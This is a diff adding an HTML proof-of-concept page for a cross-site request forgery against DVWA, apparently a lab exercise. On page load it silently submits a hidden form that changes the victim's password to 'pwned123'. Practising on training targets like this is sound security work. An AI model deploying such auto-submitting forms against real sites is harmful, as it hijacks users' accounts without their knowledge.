@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <!-- Replace DVWA_HOST with your lab DVWA host (including path if needed) -->
+    <form action="http://DVWA_HOST/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="pwned123">
+      <input type="hidden" name="password_conf" value="pwned123">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+    <p>If the demo ran, the victim's DVWA password will be changed to <code>pwned123</code>.</p>
+  </body>
+</html>
